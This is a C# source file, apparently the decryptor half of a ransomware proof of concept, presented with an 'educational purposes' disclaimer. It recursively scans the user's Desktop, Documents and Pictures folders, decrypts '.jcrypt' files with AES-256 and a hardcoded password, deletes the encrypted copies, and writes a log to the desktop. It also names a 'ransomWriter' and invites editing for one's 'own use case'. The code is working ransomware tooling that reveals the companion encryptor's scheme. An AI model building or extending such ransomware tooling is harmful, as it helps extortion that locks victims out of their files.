using System;
using System.IO;
using System.Security.Cryptography;

namespace DecrypterPOC
{
    class Program
    {

        /*
         *  THIS IS A PROOF OF CONCEPT. DO NOT USE THIS TO COMMIT CRIME.
         *  I AM NOT RESPONSIBLE FOR YOU DOING DUMB STUFF.
         *  THIS SOURCE HAS BEEN USED AND MADE AVAILABLE
         *  FOR PRESENTATION AND EDUCATIONAL PURPOSES. 
         */





        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //

        private const bool DELETE_ENCRYPTED_FILE = true; /* CAUTION */
        private const bool DECRYPT_DESKTOP = true;
        private const bool DECRYPT_DOCUMENTS = true;
        private const bool DECRYPT_PICTURES = true;
        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
        private const string ENCRYPT_PASSWORD = "Password1";

        // ----------------------------- END -------------------------------- //






        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string DECRYPTION_LOG = "";
        private static int decryptedFileCount = 0;
        static void Main(string[] args)
        {
            if (DECRYPT_DESKTOP)
            {
                decryptFolderContents(DESKTOP_FOLDER);
            }

            if (DECRYPT_PICTURES)
            {
                decryptFolderContents(PICTURES_FOLDER);
            }

            if (DECRYPT_DOCUMENTS)
            {
                decryptFolderContents(DOCUMENTS_FOLDER);
            }

            if (decryptedFileCount > 0)
            {
                dropDecryptionLog();
            }
            else
            {
                Console.Out.WriteLine("No files to encrypt.");
            }

        }

        private static void dropDecryptionLog()
        {
            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___DECRYPTION_LOG.txt");
            ransomWriter.WriteLine(decryptedFileCount + " files have been decrypted." +
                "\n----------------------------------------\n" +
                DECRYPTION_LOG);
            ransomWriter.Close();
        }

        private static bool fileIsEncrypted(string inputFile)
        {
            if (inputFile.Contains(ENCRYPTED_FILE_EXTENSION))
                if (inputFile.Substring(inputFile.Length - ENCRYPTED_FILE_EXTENSION.Length, ENCRYPTED_FILE_EXTENSION.Length) == ENCRYPTED_FILE_EXTENSION)
                    return true;
            return false; 
        }

        static void decryptFolderContents(string sDir)
        {
            try
            {
                foreach (string file in Directory.GetFiles(sDir))
                {
                    if (fileIsEncrypted(file))
                    {
                        FileDecrypt(file, file.Substring(0, file.Length - ENCRYPTED_FILE_EXTENSION.Length), ENCRYPT_PASSWORD);
                    }
                }

                foreach (string directory in Directory.GetDirectories(sDir))
                {
                    decryptFolderContents(directory);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                fsCrypt.Close();
                if (DELETE_ENCRYPTED_FILE)
                    File.Delete(inputFile);
                DECRYPTION_LOG += inputFile + "\n";
                decryptedFileCount++;
            }
        }
    }
}
